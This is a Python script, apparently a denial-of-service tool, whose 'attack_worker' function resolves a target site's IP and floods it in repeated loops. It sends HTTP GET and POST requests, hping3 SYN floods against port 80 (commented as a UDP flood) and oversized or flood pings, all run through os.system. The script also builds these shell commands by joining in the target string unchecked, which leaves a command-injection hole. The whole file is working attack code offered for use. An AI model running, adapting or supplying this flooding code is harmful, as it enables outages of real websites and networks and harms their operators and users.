#!/usr/bin/env python3
import requests
import time
from termcolor import colored
import sys
import socket
from urllib.parse import urlparse
from multiprocessing import Process, freeze_support
import os

def get(url):
    try:
        response = requests.get(url, timeout=5)
        print(colored(f"[{os.getpid()}] GET → {url} - Status: {response.status_code}", "green"))
    except Exception as e:
        print(colored(f"[{os.getpid()}] GET Error → {url}: {e}", "red"))

def post(url, datos):
    try:
        response = requests.post(url, json=datos, timeout=5)
        print(colored(f"[{os.getpid()}] POST → {url} - Status: {response.status_code}", "green"))
    except Exception as e:
        print(colored(f"[{os.getpid()}] POST Error → {url}: {e}", "red"))


def post_ping_abuse_packet(ip):
   #ping -t -l 65530
   return os.system("ping -t -l 65500 " + ip)

def post_udp_flood(ip, port):
    #udp flood
    return os.system("hping3 -c 10000 -d 120 -S -w 64 --flood " + ip + " -p " + port)

def post_ping_abuse_packet_second_command(ip):
    # ping <objetivo> -f -l 1472
    return os.system("ping " + ip + " -f -l 1472")


def post_without_data(url):
    try:
        response = requests.post(url, timeout=5)
        print(colored(f"[{os.getpid()}] POST (no data) → {url} - Status: {response.status_code}", "green"))
    except Exception as e:
        print(colored(f"[{os.getpid()}] POST (no data) Error → {url}: {e}", "red"))

def get_ip_from_url(url):
    try:
        dominio = urlparse(url).hostname
        ip = socket.gethostbyname(dominio)
        return ip
    except:
        return None


def attack_worker(target_url, data, iterations=10):
    """Function that executes each worker process"""
    print(colored(f"[Process {os.getpid()}] Starting parallel attack...", "yellow"))
    ip = get_ip_from_url(target_url)
    print(colored(f"[Process {os.getpid()}] Target IP: {ip if ip else 'Could not resolve IP'}", "yellow"))
    for i in range(iterations):
        try:
            get(target_url)
            post(target_url, data)
            post_without_data(target_url)
            
            if ip is not None:
                post_udp_flood(ip, "80")
                post_ping_abuse_packet(ip)
                post_ping_abuse_packet_second_command(ip)

            # Small pause to avoid saturating too quickly (adjustable)
            time.sleep(0.1)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(colored(f"[Process {os.getpid()}] Error in iteration {i}: {e}", "red"))
    
    print(colored(f"[Process {os.getpid()}] Worker finished after {iterations} iterations.", "yellow"))


